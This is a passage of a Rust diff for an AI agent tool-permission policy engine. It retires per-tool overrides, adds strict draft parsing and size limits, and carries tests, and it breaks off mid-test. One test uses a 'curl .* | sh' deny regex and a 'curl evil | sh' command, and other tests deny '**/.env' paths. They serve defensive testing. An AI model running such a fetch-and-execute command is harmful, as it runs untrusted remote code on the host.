@@ -4,7 +4,7 @@ use serde_json::Value;
 
 // ─── Policy document (YAML v0) ────────────────────────────────────────────
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize)]
 pub struct Policy {
     pub name: String,
     #[serde(default)]
@@ -19,9 +19,106 @@ pub struct Policy {
     pub autonomy: AutonomySettings,
     #[serde(default)]
     pub tools: Vec<ToolRule>,
-    /// See `ToolOverride`. Populated from the DB column, never from YAML.
+}
+
+/// The lenient wire shape behind [`Policy`]'s `Deserialize`, plus the LEGACY
+/// pre-0026 `managed_overrides` key.
+#[derive(Deserialize)]
+struct PolicyDe {
+    name: String,
     #[serde(default)]
-    pub managed_overrides: Vec<ToolOverride>,
+    defaults: PolicyDefaults,
+    #[serde(default)]
+    egress: Egress,
+    #[serde(default)]
+    budgets: crate::spec::Budgets,
+    #[serde(default)]
+    approvals: ApprovalSettings,
+    #[serde(default)]
+    autonomy: AutonomySettings,
+    #[serde(default)]
+    tools: Vec<ToolRule>,
+    #[serde(default)]
+    managed_overrides: Vec<LegacyToolOverride>,
+}
+
+/// The retired 0010 per-tool override shape, accepted ONLY at this boundary.
+#[derive(Deserialize)]
+struct LegacyToolOverride {
+    tool: String,
+    action: RuleAction,
+}
+
+/// Deserialization FOLDS a legacy `managed_overrides` key into head rules —
+/// `{match: [tool], action}`, stored order, ahead of the authored rules — the
+/// exact transform migration 0026 applies to stored policies (pinned
+/// equivalent by `override_fold_preserves_every_verdict`). This is what keeps
+/// a pre-0026 frozen RunSpec snapshot governing its in-flight run with
+/// PRECISELY the semantics it froze, while `sessions.run_spec` stays
+/// byte-identical: the engine has no override branch, the compat lives here.
+/// Serialization never emits the key — a Policy that round-trips through us
+/// is post-fold, canonically. Unknown keys stay IGNORED (never
+/// `deny_unknown_fields` here — old blobs must keep deserializing); the
+/// authoring path gets its strictness from [`Policy::parse_strict`] instead.
+///
+/// TRAILING-WILDCARD entries are DROPPED rather than folded, and 0026 does the
+/// same. The retired engine matched an override by exact string equality,
+/// never through `tool_matches`, so a stored `mcp__*` decided nothing for
+/// `mcp__kb__search`; folding it into a head rule would put it through
+/// `tool_matches` and hand the whole namespace that action — a silent
+/// WIDENING of a policy that is already governing a run.
+///
+/// The test is `ends_with('*')`, not `contains('*')`, because it must name
+/// exactly what `tool_matches` treats as a wildcard. A `*` in the MIDDLE
+/// (`fo*o`) is not special there, so such an entry folds to an exact-equality
+/// rule meaning precisely what the override meant — dropping it would narrow
+/// for no reason.
+///
+/// EXACT SCOPE OF THE EQUIVALENCE, stated honestly: the fold preserves every
+/// verdict for every tool whose LITERAL NAME DOES NOT END IN `*`. For a tool
+/// that DOES — `ToolCallRequest.tool` is unconstrained, and an MCP server
+/// names its own tools — the dropped entry used to decide by exact equality
+/// and now does not, so the verdict falls through to the rules. That can go
+/// EITHER WAY, including wider (override `deny` + policy default `allow` ⇒
+/// allow). It is not "always fail-safe" and this comment does not claim it is;
+/// `a_wildcard_override_diverges_only_for_star_suffixed_tool_names` pins the
+/// divergence with exactly that input.
+///
+/// Dropping is still the right side of the trade, on BLAST RADIUS rather than
+/// direction: dropping can change the verdict for the ONE literal name, while
+/// keeping changes it for an entire namespace. The API never permitted such an
+/// entry (`validate()` refused wildcard overrides from the day the column
+/// shipped), so reaching this at all takes a hand-edited database.
+impl<'de> Deserialize<'de> for Policy {
+    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
+    where
+        D: serde::Deserializer<'de>,
+    {
+        let raw = PolicyDe::deserialize(deserializer)?;
+        let head = raw
+            .managed_overrides
+            .into_iter()
+            .filter(|o| !o.tool.ends_with('*'))
+            .map(|o| ToolRule {
+                r#match: vec![o.tool],
+                action: o.action,
+                risk: None,
+                paths: None,
+                shell: None,
+                on_autonomous: None,
+                approval_ttl_secs: None,
+                approval_scope: None,
+            });
+        Ok(Policy {
+            name: raw.name,
+            defaults: raw.defaults,
+            egress: raw.egress,
+            budgets: raw.budgets,
+            approvals: raw.approvals,
+            autonomy: raw.autonomy,
+            tools: head.chain(raw.tools).collect(),
+        })
+    }
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -162,19 +259,6 @@ pub struct ToolRule {
     pub approval_scope: Option<ApprovalScope>,
 }
 
-/// A UI-owned, per-tool decision. Consulted BEFORE `tools` — an explicit
-/// decision about one tool beats the general rules without reordering anything
-/// the user authored. NEVER present in authored YAML: it is stored in its own
-/// `policies.managed_overrides` column and merged into `parsed`.
-///
-/// `tool` is an EXACT name (never a matcher) — a wildcard here would be an
-/// un-reviewable blanket rule authored by a click.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-pub struct ToolOverride {
-    pub tool: String,
-    pub action: RuleAction,
-}
-
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct PathRules {
     #[serde(default)]
@@ -195,6 +279,320 @@ pub struct ShellRules {
     /// Verdict when neither deny nor an allow-prefix hits. Fail-safe: approve.
     #[serde(default = "default_tool_action")]
     pub on_no_match: RuleAction,
+}
+
+// ─── Strict authoring mirror ──────────────────────────────────────────────
+//
+// The publish path parses drafts through THIS shape (`deny_unknown_fields` at
+// every level), so a typo'd field name is a 422 — never a silently-dropped
+// key publishing a weaker policy than its author reviewed. Stored blobs keep
+// the lenient [`Policy`] deserializer above: frozen snapshots carry keys
+// (`managed_overrides`) this shape deliberately refuses.
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftPolicy {
+    name: String,
+    #[serde(default)]
+    defaults: DraftDefaults,
+    #[serde(default)]
+    egress: DraftEgress,
+    #[serde(default)]
+    budgets: DraftBudgets,
+    #[serde(default)]
+    approvals: DraftApprovals,
+    #[serde(default)]
+    autonomy: DraftAutonomy,
+    #[serde(default)]
+    tools: Vec<DraftToolRule>,
+}
+
+#[derive(Deserialize, Default)]
+#[serde(deny_unknown_fields)]
+struct DraftDefaults {
+    #[serde(default = "default_tool_action")]
+    tool_action: RuleAction,
+}
+
+#[derive(Deserialize, Default)]
+#[serde(deny_unknown_fields)]
+struct DraftEgress {
+    #[serde(default)]
+    mode: EgressMode,
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftBudgets {
+    max_wall_clock_secs: Option<u64>,
+    max_tokens: Option<u64>,
+    max_cost_usd: Option<f64>,
+    max_tool_calls: Option<u64>,
+}
+
+impl Default for DraftBudgets {
+    fn default() -> Self {
+        let b = crate::spec::Budgets::default();
+        Self {
+            max_wall_clock_secs: b.max_wall_clock_secs,
+            max_tokens: b.max_tokens,
+            max_cost_usd: b.max_cost_usd,
+            max_tool_calls: b.max_tool_calls,
+        }
+    }
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftApprovals {
+    #[serde(default = "default_ttl")]
+    default_ttl_secs: u64,
+    #[serde(default)]
+    scope: ApprovalScope,
+    #[serde(default)]
+    timeout_action: TimeoutAction,
+}
+
+impl Default for DraftApprovals {
+    fn default() -> Self {
+        Self {
+            default_ttl_secs: default_ttl(),
+            scope: ApprovalScope::default(),
+            timeout_action: TimeoutAction::default(),
+        }
+    }
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftAutonomy {
+    #[serde(default = "default_true")]
+    permitted: bool,
+    #[serde(default)]
+    on_approval_rule: AutonomousFallback,
+}
+
+impl Default for DraftAutonomy {
+    fn default() -> Self {
+        Self {
+            permitted: true,
+            on_approval_rule: AutonomousFallback::default(),
+        }
+    }
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftToolRule {
+    r#match: Vec<String>,
+    action: RuleAction,
+    #[serde(default)]
+    risk: Option<String>,
+    #[serde(default)]
+    paths: Option<DraftPathRules>,
+    #[serde(default)]
+    shell: Option<DraftShellRules>,
+    #[serde(default)]
+    on_autonomous: Option<AutonomousFallback>,
+    #[serde(default)]
+    approval_ttl_secs: Option<u64>,
+    #[serde(default)]
+    approval_scope: Option<ApprovalScope>,
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftPathRules {
+    #[serde(default)]
+    allow: Vec<String>,
+    #[serde(default)]
+    deny: Vec<String>,
+}
+
+#[derive(Deserialize)]
+#[serde(deny_unknown_fields)]
+struct DraftShellRules {
+    #[serde(default)]
+    allow_prefixes: Vec<String>,
+    #[serde(default)]
+    deny_regex: Vec<String>,
+    #[serde(default = "default_tool_action")]
+    on_no_match: RuleAction,
+}
+
+impl From<DraftPolicy> for Policy {
+    fn from(d: DraftPolicy) -> Self {
+        Policy {
+            name: d.name,
+            defaults: PolicyDefaults {
+                tool_action: d.defaults.tool_action,
+            },
+            egress: Egress {
+                mode: d.egress.mode,
+            },
+            budgets: crate::spec::Budgets {
+                max_wall_clock_secs: d.budgets.max_wall_clock_secs,
+                max_tokens: d.budgets.max_tokens,
+                max_cost_usd: d.budgets.max_cost_usd,
+                max_tool_calls: d.budgets.max_tool_calls,
+            },
+            approvals: ApprovalSettings {
+                default_ttl_secs: d.approvals.default_ttl_secs,
+                scope: d.approvals.scope,
+                timeout_action: d.approvals.timeout_action,
+            },
+            autonomy: AutonomySettings {
+                permitted: d.autonomy.permitted,
+                on_approval_rule: d.autonomy.on_approval_rule,
+            },
+            tools: d
+                .tools
+                .into_iter()
+                .map(|r| ToolRule {
+                    r#match: r.r#match,
+                    action: r.action,
+                    risk: r.risk,
+                    paths: r.paths.map(|p| PathRules {
+                        allow: p.allow,
+                        deny: p.deny,
+                    }),
+                    shell: r.shell.map(|s| ShellRules {
+                        allow_prefixes: s.allow_prefixes,
+                        deny_regex: s.deny_regex,
+                        on_no_match: s.on_no_match,
+                    }),
+                    on_autonomous: r.on_autonomous,
+                    approval_ttl_secs: r.approval_ttl_secs,
+                    approval_scope: r.approval_scope,
+                })
+                .collect(),
+        }
+    }
+}
+
+/// Policy names that the `/v1/policies/*` routes claim as STATIC segments. A
+/// policy carrying one would be unreachable by its own URL, so every creating
+/// path refuses it — the API (clone + yaml import) and the boot seed alike.
+///
+/// It lives in `fluidbox-core` because it has exactly two consumers in two
+/// crates that cannot see each other (`fluidbox-server::api` and
+/// `fluidbox-db::seed`), and a list duplicated across them is a list that
+/// drifts. `fluidbox-server`'s `policy_routes_are_all_reserved` test pins it
+/// against the router's actual static segments, so adding a route without
+/// adding its name here is a test failure rather than a policy nobody can
+/// open.
+pub const RESERVED_POLICY_NAMES: &[&str] = &["validate", "preview", "clone"];
+
+/// Is `name` claimed by a static `/v1/policies/*` route?
+pub fn is_reserved_policy_name(name: &str) -> bool {
+    RESERVED_POLICY_NAMES.contains(&name)
+}
+
+// ─── Authoring bounds ─────────────────────────────────────────────────────
+//
+// A draft is UNTRUSTED input that ends up frozen into EVERY future RunSpec of
+// every agent on the policy, so it is bounded at the authoring boundary the
+// same way `schema_guard` bounds a frozen tool schema. The numbers are far
+// above any real policy (the seed has 12 rules) and far below anything that
+// would bloat a snapshot: the point is a definite refusal naming the limit,
+// not a tuned budget. Stored blobs are NOT re-checked — an existing policy
+// that predates a bound must keep governing its runs.
+
+/// Ordered rules in one policy.
+const MAX_RULES: usize = 512;
+/// Matchers on one rule.
+const MAX_MATCHERS_PER_RULE: usize = 256;
+/// Globs/regexes/prefixes in one constraint list.
+const MAX_CONSTRAINT_PATTERNS: usize = 256;
+/// Any single authored string (name, matcher, glob, regex, prefix, risk note).
+const MAX_AUTHORED_STRING: usize = 1024;
+
+fn bound_strings(what: &str, values: &[String]) -> Result<(), String> {
+    for v in values {
+        if v.len() > MAX_AUTHORED_STRING {
+            return Err(format!(
+                "{what}: {:?}… is {} bytes; the limit is {MAX_AUTHORED_STRING}",
+                v.chars().take(32).collect::<String>(),
+                v.len()
+            ));
+        }
+    }
+    Ok(())
+}
+
+fn bound_draft(p: &Policy) -> Result<(), String> {
+    if p.name.len() > MAX_AUTHORED_STRING {
+        return Err(format!(
+            "policy name is {} bytes; the limit is {MAX_AUTHORED_STRING}",
+            p.name.len()
+        ));
+    }
+    if p.tools.len() > MAX_RULES {
+        return Err(format!("{} rules; the limit is {MAX_RULES}", p.tools.len()));
+    }
+    for (i, rule) in p.tools.iter().enumerate() {
+        if rule.r#match.len() > MAX_MATCHERS_PER_RULE {
+            return Err(format!(
+                "tools[{i}]: {} matchers; the limit is {MAX_MATCHERS_PER_RULE}",
+                rule.r#match.len()
+            ));
+        }
+        bound_strings(&format!("tools[{i}].match"), &rule.r#match)?;
+        if let Some(risk) = &rule.risk {
+            bound_strings(&format!("tools[{i}].risk"), std::slice::from_ref(risk))?;
+        }
+        if let Some(paths) = &rule.paths {
+            for (field, list) in [("allow", &paths.allow), ("deny", &paths.deny)] {
+                if list.len() > MAX_CONSTRAINT_PATTERNS {
+                    return Err(format!(
+                        "tools[{i}].paths.{field}: {} patterns; the limit is {MAX_CONSTRAINT_PATTERNS}",
+                        list.len()
+                    ));
+                }
+                bound_strings(&format!("tools[{i}].paths.{field}"), list)?;
+            }
+        }
+        if let Some(shell) = &rule.shell {
+            for (field, list) in [
+                ("allow_prefixes", &shell.allow_prefixes),
+                ("deny_regex", &shell.deny_regex),
+            ] {
+                if list.len() > MAX_CONSTRAINT_PATTERNS {
+                    return Err(format!(
+                        "tools[{i}].shell.{field}: {} patterns; the limit is {MAX_CONSTRAINT_PATTERNS}",
+                        list.len()
+                    ));
+                }
+                bound_strings(&format!("tools[{i}].shell.{field}"), list)?;
+            }
+        }
+    }
+    Ok(())
+}
+
+impl Policy {
+    /// Parse AUTHORED content (the publish/preview paths): unknown fields are
+    /// refused at every level, the document is BOUNDED (it will be frozen into
+    /// every future RunSpec), then the result passes [`Policy::validate`].
+    /// Legacy stored blobs go through the lenient `Deserialize` instead — and
+    /// are deliberately not re-bounded, so a bound introduced later can never
+    /// strand a policy that is already governing runs.
+    pub fn parse_strict(value: Value) -> Result<Policy, String> {
+        let draft: DraftPolicy = serde_json::from_value(value).map_err(|e| e.to_string())?;
+        let policy: Policy = draft.into();
+        bound_draft(&policy)?;
+        policy.validate()?;
+        Ok(policy)
+    }
+
+    /// [`Policy::parse_strict`] for AUTHORED YAML (the import, validate, and
+    /// boot-seed paths): a typo'd key in a yaml file must refuse, not silently
+    /// weaken the policy it describes. `parse_yaml` stays lenient for stored
+    /// blobs and test fixtures.
+    pub fn parse_yaml_strict(yaml: &str) -> Result<Policy, String> {
+        let value: Value = serde_yaml::from_str(yaml).map_err(|e| e.to_string())?;
+        Self::parse_strict(value)
+    }
 }
 
 // ─── Evaluation ───────────────────────────────────────────────────────────
@@ -289,7 +687,13 @@ pub struct ConstraintSummary {
 pub enum ToolStatus {
     Unconditional {
         action: RuleAction,
-        rule: Option<usize>,
+        /// The rule that decided it. Never optional: with `Overridden` retired
+        /// (0026 folded overrides into ordinary head rules) EVERY
+        /// unconditional verdict comes from a real, indexable rule — and the
+        /// dashboard indexes the draft with it to recognise a matrix-authored
+        /// head rule. An `Option` here would be dead width that every consumer
+        /// still had to null-check.
+        rule: usize,
     },
     Conditional {
         /// The rule's CONSTRAINT-SATISFIED action — what happens when the
@@ -305,22 +709,6 @@ pub enum ToolStatus {
     Default {
         action: RuleAction,
     },
-    Overridden {
-        action: RuleAction,
-        underlying: Box<ToolStatus>,
-    },
-}
-
-impl ToolStatus {
-    /// Only unconditional rows may be overridden from the UI. The server
-    /// enforces this too — never the UI alone.
-    pub fn is_overridable(&self) -> bool {
-        match self {
-            ToolStatus::Unconditional { .. } | ToolStatus::Default { .. } => true,
-            ToolStatus::Overridden { underlying, .. } => underlying.is_overridable(),
-            ToolStatus::Conditional { .. } => false,
-        }
-    }
 }
 
 /// Can this rule ever produce a RequireApproval verdict? Mirrors the THREE
@@ -369,44 +757,6 @@ impl Policy {
                 }
             }
         }
-        // Managed overrides. The ENGINE keeps these invariants, not the write
-        // path: an override is stored once but re-merged into EVERY later
-        // policy version, so a `paths`/`shell` constraint added to a rule
-        // afterwards would be silently erased by an override that was valid
-        // when written — a dead constraint that still DISPLAYS. Refusing the
-        // whole policy here makes that impossible to reach.
-        let mut seen: Vec<&str> = Vec::new();
-        for (i, o) in self.managed_overrides.iter().enumerate() {
-            if o.tool.contains('*') {
-                return Err(format!(
-                    "managed_overrides[{i}]: tool {:?} is a wildcard — overrides name one exact tool; a matcher here is permanently-dead config",
-                    o.tool
-                ));
-            }
-            if seen.contains(&o.tool.as_str()) {
-                return Err(format!(
-                    "managed_overrides[{i}]: duplicate override for tool {:?} — one decision per tool",
-                    o.tool
-                ));
-            }
-            seen.push(&o.tool);
-            // First-match-wins, exactly as `evaluate_supervised` walks them:
-            // only the rule the engine would actually reach decides whether
-            // this tool is conditional. A conditional rule shadowed by an
-            // earlier one is irrelevant.
-            if let Some(rule) = self
-                .tools
-                .iter()
-                .find(|r| r.r#match.iter().any(|m| tool_matches(m, &o.tool)))
-            {
-                if rule.paths.is_some() || rule.shell.is_some() {
-                    return Err(format!(
-                        "managed_overrides[{i}]: managed override for '{}' targets a conditional rule (match: {:?}) — a rule carrying paths/shell cannot be reduced to a single action; clear the override before adding path/shell constraints to that rule",
-                        o.tool, rule.r#match
-                    ));
-                }
-            }
-        }
         Ok(())
     }
 
@@ -442,16 +792,6 @@ impl Policy {
     }
 
     fn tool_status(&self, tool: &str) -> ToolStatus {
-        if let Some(o) = self.managed_overrides.iter().find(|o| o.tool == tool) {
-            return ToolStatus::Overridden {
-                action: o.action,
-                underlying: Box::new(self.base_tool_status(tool)),
-            };
-        }
-        self.base_tool_status(tool)
-    }
-
-    fn base_tool_status(&self, tool: &str) -> ToolStatus {
         for (i, rule) in self.tools.iter().enumerate() {
             if !rule.r#match.iter().any(|m| tool_matches(m, tool)) {
                 continue;
@@ -460,7 +800,7 @@ impl Policy {
             if !conditional {
                 return ToolStatus::Unconditional {
                     action: rule.action,
-                    rule: Some(i),
+                    rule: i,
                 };
             }
             let mut c = ConstraintSummary::default();
@@ -523,13 +863,6 @@ impl Policy {
     }
 
     fn evaluate_supervised(&self, req: &ToolCallRequest) -> (Verdict, Option<usize>) {
-        // A managed override is an explicit decision about ONE exact tool; it
-        // wins over the general rules. Exact equality (never `tool_matches`)
-        // keeps a click from authoring a wildcard. No rule index: the override
-        // replaced the rule, so the rule's on_autonomous must not apply.
-        if let Some(o) = self.managed_overrides.iter().find(|o| o.tool == req.tool) {
-            return (self.finish(o.action, None, &req.tool, None), None);
-        }
         for (i, rule) in self.tools.iter().enumerate() {
             if !rule.r#match.iter().any(|m| tool_matches(m, &req.tool)) {
                 continue;
@@ -1094,6 +1427,389 @@ tools:
         deny("Bash", json!({"command": ""}));
     }
 
+    /// The 0026 fold turns a per-tool override into a HEAD rule. Where such a
+    /// head rule sits ahead of a conditional rule matching the same tool,
+    /// `validate()` must ACCEPT it (the pre-fold check refused the override
+    /// shape, not the rule shape) and first-match-wins must let it decide —
+    /// exactly the precedence the override had. Editing it away is now a
+    /// legitimate, versioned, revertible rule edit (design §4.3).
+    #[test]
+    fn a_head_rule_ahead_of_a_conditional_rule_validates_and_wins() {
+        let yaml = r#"
+name: t
+tools:
+  - match: ["Bash"]
+    action: allow
+  - match: ["Bash"]
+    action: approve
+    shell:
+      deny_regex: ["curl .* \\| sh"]
+"#;
+        let p = Policy::parse_yaml(yaml).expect("a head rule over a conditional rule is valid");
+        let out = p.evaluate(
+            &req("Bash", json!({"command": "curl evil | sh"})),
+            Autonomy::Supervised,
+        );
+        assert_eq!(out.effective, Verdict::Allow);
+        assert_eq!(out.matched_rule, Some(0));
+    }
+
+    /// A matrix-authored (folded) head rule is a REAL rule: the matrix reports
+    /// it as `Unconditional { rule: 0 }`, never a distinct status — the
+    /// `Overridden` variant is gone and nothing constructs it (design §4.3).
+    #[test]
+    fn a_matrix_authored_head_rule_resolves_as_unconditional_rule_zero() {
+        let yaml = r#"
+name: t
+defaults: { tool_action: approve }
+tools:
+  - match: ["mcp__cloudflare__kv_list"]
+    action: allow
+  - match: ["mcp__*"]
+    action: approve
+"#;
+        let p = Policy::parse_yaml(yaml).expect("parses");
+        let m: std::collections::HashMap<String, ToolStatus> = p
+            .tool_matrix(&["mcp__cloudflare__kv_list".to_string()])
+            .into_iter()
+            .collect();
+        assert_eq!(
+            m["mcp__cloudflare__kv_list"],
+            ToolStatus::Unconditional {
+                action: RuleAction::Allow,
+                rule: 0
+            }
+        );
+    }
+
+    /// Historical RunSpec snapshots (pre-0026) carry a `managed_overrides` key
+    /// and their in-flight runs must keep EXACTLY the semantics they froze —
+    /// while `sessions.run_spec` stays byte-identical. Deserialization folds
+    /// the key into head rules (the 0026 transform), so the override still
+    /// wins over the rules below it, and re-serialization emits a post-fold
+    /// document with no legacy key.
+    #[test]
+    fn stored_managed_overrides_fold_into_head_rules_on_read() {
+        let p: Policy = serde_json::from_value(json!({
+            "name": "t",
+            "defaults": { "tool_action": "approve" },
+            "tools": [{ "match": ["SomeTool"], "action": "deny" }],
+            "managed_overrides": [{ "tool": "SomeTool", "action": "allow" }],
+        }))
+        .expect("pre-0026 snapshots must keep deserializing");
+        let out = p.evaluate(&req("SomeTool", json!({})), Autonomy::Supervised);
+        assert_eq!(
+            out.effective,
+            Verdict::Allow,
+            "the frozen override must keep beating the rules below it"
+        );
+        assert_eq!(
+            out.matched_rule,
+            Some(0),
+            "the fold made it a REAL head rule"
+        );
+        let round_tripped = serde_json::to_value(&p).expect("serializes");
+        assert!(
+            round_tripped.get("managed_overrides").is_none(),
+            "serialization must emit the post-fold canonical document"
+        );
+        assert_eq!(round_tripped["tools"][0]["match"], json!(["SomeTool"]));
+    }
+
+    /// A TRAILING-WILDCARD override is dropped by the fold, not turned into a
+    /// wildcard rule — the one place the transform deliberately loses an entry.
+    ///
+    /// The retired engine matched overrides by exact string equality, so
+    /// `mcp__*` decided nothing for `mcp__kb__search`. Folding it into a head
+    /// rule would put it through `tool_matches` and hand the ENTIRE namespace
+    /// that action: an in-flight run's frozen law, silently widened at the
+    /// moment its snapshot is read. Migration 0026 drops such entries with a
+    /// `raise warning`; this pins that the engine agrees, so a migrated policy
+    /// and a still-frozen snapshot of it resolve identically.
+    ///
+    /// A `*` that is NOT trailing is kept, because `tool_matches` does not
+    /// treat it as a wildcard either — folding it yields exact equality, which
+    /// is precisely what the override meant.
+    #[test]
+    fn a_wildcard_override_is_dropped_not_folded() {
+        let legacy = json!({
+            "name": "t",
+            "defaults": { "tool_action": "deny" },
+            "tools": [],
+            "managed_overrides": [
+                { "tool": "mcp__*", "action": "allow" },
+                { "tool": "fo*o", "action": "allow" },
+                { "tool": "mcp__kb__search", "action": "approve" },
+            ],
+        });
+        let p: Policy = serde_json::from_value(legacy).expect("deserializes");
+        assert_eq!(
+            p.tools.len(),
+            2,
+            "the trailing-wildcard entry is dropped; the mid-string one is not: {:?}",
+            p.tools
+        );
+        assert_eq!(p.tools[0].r#match, vec!["fo*o".to_string()]);
+        assert_eq!(p.tools[1].r#match, vec!["mcp__kb__search".to_string()]);
+        // `fo*o` folds to EXACT equality — the same thing the override meant.
+        assert_eq!(
+            p.evaluate(&req("fo*o", json!({})), Autonomy::Supervised)
+                .effective,
+            Verdict::Allow
+        );
+        assert!(matches!(
+            p.evaluate(&req("food", json!({})), Autonomy::Supervised)
+                .effective,
+            Verdict::Deny { .. }
+        ));
+        // A sibling in the namespace keeps falling through to the DEFAULT —
+        // exactly what the pre-fold engine did, and NOT what a folded
+        // `mcp__*` rule would have done (allow).
+        assert!(matches!(
+            p.evaluate(&req("mcp__other__thing", json!({})), Autonomy::Supervised)
+                .effective,
+            Verdict::Deny { .. }
+        ));
+    }
+
+    /// The fold's ONE divergence, pinned with the input that shows it going the
+    /// WRONG way — because a test that only demonstrated the comfortable
+    /// direction would let the comment above drift back into claiming the fold
+    /// is always fail-safe. It is not.
+    ///
+    /// `ToolCallRequest.tool` is unconstrained (an MCP server names its own
+    /// tools), so a tool whose LITERAL name ends in `*` can exist. Pre-fold, an
+    /// override on that exact name decided it. Post-fold the entry is gone, so
+    /// the verdict falls through to the rules — which here are more permissive
+    /// than the override was. That is a WIDENING.
+    ///
+    /// Dropping is still the right trade, but on blast radius, not direction:
+    /// dropping moves the verdict for ONE literal name, keeping moves it for a
+    /// whole namespace. Reaching this at all takes a hand-edited database — the
+    /// API refused wildcard overrides from the day the column shipped.
+    #[test]
+    fn a_wildcard_override_diverges_only_for_star_suffixed_tool_names() {
+        let p: Policy = serde_json::from_value(json!({
+            "name": "t",
+            "defaults": { "tool_action": "allow" },
+            "tools": [],
+            "managed_overrides": [{ "tool": "*", "action": "deny" }],
+        }))
+        .expect("deserializes");
+        assert!(p.tools.is_empty(), "the entry is dropped");
+        assert_eq!(
+            p.evaluate(&req("*", json!({})), Autonomy::Supervised)
+                .effective,
+            Verdict::Allow,
+            "pre-fold this was DENY (exact `*` == `*`); post-fold it falls through to the \
+             default. The divergence is real and it WIDENS here — the comment on \
+             `Deserialize for Policy` must keep saying so."
+        );
+        // …and it is confined to that shape: a tool whose name does not end in
+        // `*` is untouched by the dropped entry, before or after.
+        assert_eq!(
+            p.evaluate(&req("Bash", json!({})), Autonomy::Supervised)
+                .effective,
+            Verdict::Allow
+        );
+    }
+
+    /// Unknown keys stay IGNORED on the lenient path — an old blob with keys
+    /// this build has never heard of must still deserialize.
+    #[test]
+    fn lenient_deserialization_ignores_unknown_keys() {
+        let p: Policy = serde_json::from_value(json!({
+            "name": "t",
+            "tools": [],
+            "some_future_field": {"x": 1},
+        }))
+        .expect("stored blobs must survive unknown keys");
+        assert_eq!(p.name, "t");
+    }
+
+    /// The AUTHORING path is strict at every level: a typo'd field must be a
+    /// refusal naming the key, never a silently-dropped weakening.
+    #[test]
+    fn parse_strict_refuses_unknown_fields_at_every_level() {
+        let ok = Policy::parse_strict(json!({
+            "name": "t",
+            "defaults": { "tool_action": "deny" },
+            "tools": [{ "match": ["Bash"], "action": "allow",
+                        "shell": { "allow_prefixes": ["ls"], "on_no_match": "approve" } }],
+        }))
+        .expect("a well-formed draft parses");
+        assert_eq!(ok.defaults.tool_action, RuleAction::Deny);
+
+        // Top level, nested rule, nested constraint — each refusal names the key.
+        for (draft, key) in [
+            (
+                json!({ "name": "t", "paths_deny": ["**/.env"] }),
+                "paths_deny",
+            ),
+            (
+                json!({ "name": "t",
+                        "tools": [{ "match": ["Edit"], "action": "allow",
+                                    "path": { "deny": ["**/.env"] } }] }),
+                "path",
+            ),
+            (
+                json!({ "name": "t",
+                        "tools": [{ "match": ["Edit"], "action": "allow",
+                                    "paths": { "deny": ["**/.env"], "denied": [] } }] }),
+                "denied",
+            ),
+            // The legacy override key is an authoring refusal too: drafts
+            // cannot smuggle the retired mechanism back in.
+            (
+                json!({ "name": "t",
+                        "managed_overrides": [{ "tool": "Bash", "action": "allow" }] }),
+                "managed_overrides",
+            ),
+            (
+                json!({ "name": "t",
+                        "tools": [{ "match": ["Bash"], "action": "allow",
+                                    "shell": { "allow_prefix": ["ls"] } }] }),
+                "allow_prefix",
+            ),
+            (
+                json!({ "name": "t", "defaults": { "tool_actions": "deny" } }),
+                "tool_actions",
+            ),
+            (
+                json!({ "name": "t", "egress": { "modes": "none" } }),
+                "modes",
+            ),
+            (
+                json!({ "name": "t", "budgets": { "max_token": 1 } }),
+                "max_token",
+            ),
+            (
+                json!({ "name": "t", "approvals": { "ttl_secs": 5 } }),
+                "ttl_secs",
+            ),
+            // The misspelling that would silently leave `permitted: true`.
+            (
+                json!({ "name": "t", "autonomy": { "permited": false } }),
+                "permited",
+            ),
+        ] {
+            let err = Policy::parse_strict(draft).expect_err("unknown field must refuse");
+            assert!(err.contains(key), "error must name {key:?}: {err}");
+        }
+    }
+
+    /// parse_strict runs validate(): structurally-known-but-invalid content
+    /// (a bad regex) is refused with the validator's message.
+    #[test]
+    fn parse_strict_runs_validate() {
+        let err = Policy::parse_strict(json!({
+            "name": "t",
+            "tools": [{ "match": ["Bash"], "action": "allow",
+                        "shell": { "deny_regex": ["("] } }],
+        }))
+        .expect_err("a bad regex must refuse");
+        assert!(err.contains("deny_regex"), "{err}");
+    }
+
+    /// A draft is frozen into EVERY future RunSpec of every agent on the
+    /// policy, so the authoring boundary bounds it. Each limit refuses with a
+    /// message naming the field and the limit.
+    #[test]
+    fn parse_strict_bounds_the_draft() {
+        let rule = |n: usize| json!({ "match": [format!("T{n}")], "action": "allow" });
+
+        // Rule count.
+        let err = Policy::parse_strict(json!({
+            "name": "t",
+            "tools": (0..MAX_RULES + 1).map(rule).collect::<Vec<_>>(),
+        }))
+        .expect_err("too many rules must refuse");
+        assert!(err.contains(&MAX_RULES.to_string()), "{err}");
+        // …and exactly at the limit is fine.
+        Policy::parse_strict(json!({
+            "name": "t",
+            "tools": (0..MAX_RULES).map(rule).collect::<Vec<_>>(),
+        }))
+        .expect("the limit itself is allowed");
+
+        // Matchers on one rule.
+        let err = Policy::parse_strict(json!({
+            "name": "t",
+            "tools": [{ "match": vec!["T"; MAX_MATCHERS_PER_RULE + 1], "action": "allow" }],
+        }))
+        .expect_err("too many matchers must refuse");
+        assert!(
+            err.contains("tools[0]") && err.contains("matchers"),
+            "{err}"
+        );
+
+        // Patterns in one constraint list, on both constraint kinds.
+        for (field, constraint) in [
+            (
+                "paths",
+                json!({ "deny": vec!["**"; MAX_CONSTRAINT_PATTERNS + 1] }),
+            ),
+            (
+                "shell",
+                json!({ "allow_prefixes": vec!["ls"; MAX_CONSTRAINT_PATTERNS + 1] }),
+            ),
+        ] {
+            let err = Policy::parse_strict(json!({
+                "name": "t",
+                "tools": [{ "match": ["Bash"], "action": "allow", field: constraint }],
+            }))
+            .expect_err("too many patterns must refuse");
+            assert!(err.contains(field) && err.contains("patterns"), "{err}");
+        }
+
+        // Any single authored string, wherever it appears.
